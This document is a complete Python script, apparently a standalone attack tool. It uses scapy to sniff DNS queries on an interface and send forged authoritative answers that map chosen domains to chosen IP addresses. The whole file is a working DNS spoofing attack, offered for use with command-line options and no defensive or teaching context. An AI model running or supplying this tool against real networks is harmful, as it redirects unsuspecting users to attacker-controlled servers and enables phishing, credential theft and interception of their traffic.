#!/usr/bin/env python3
from scapy.all import *
import argparse

def process_packet(pkt, spoof_map, iface):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode().rstrip('.')
        
        if qname in spoof_map:
            spoof_ip = spoof_map[qname]
            print(f"[+] {qname} -> {spoof_ip}")
            
            dns_reply = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                        UDP(dport=pkt[UDP].sport, sport=53) / \
                        DNS(
                            id=pkt[DNS].id,
                            qr=1,
                            aa=1,
                            qd=pkt[DNS].qd,
                            an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoof_ip)
                        )
            
            send(dns_reply, verbose=0, iface=iface)

def main():
    parser = argparse.ArgumentParser(description="DNS Spoofing")
    parser.add_argument("-i", "--iface", required=True, help="Interface")
    parser.add_argument("-d", "--domain", action="append", required=True, help="domain=ip")
    
    args = parser.parse_args()
    
    spoof_map = {}
    for item in args.domain:
        domain, ip = item.split("=")
        spoof_map[domain] = ip
    
    print(f"[*] DNS spoofing on {args.iface}")
    for d, ip in spoof_map.items():
        print(f"    {d} -> {ip}")
    
    sniff(iface=args.iface, filter="udp port 53", 
          prn=lambda pkt: process_packet(pkt, spoof_map, args.iface), store=0)

if __name__ == "__main__":
    main()
